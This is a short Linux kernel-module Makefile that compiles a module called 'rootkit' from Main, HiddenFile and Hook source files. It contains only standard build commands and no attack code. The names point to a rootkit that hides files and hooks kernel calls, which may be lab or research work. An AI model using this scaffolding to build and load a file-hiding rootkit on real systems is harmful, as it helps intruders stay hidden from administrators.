KERNEL_DIR := /lib/modules/$(shell uname -r)/build

ccflags-y := -I$(src)/include

obj-m := rootkit.o
rootkit-y := src/Main.o
rootkit-y += src/HiddenFile.o
rootkit-y += src/Hook.o

all:
	make -C ${KERNEL_DIR} M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean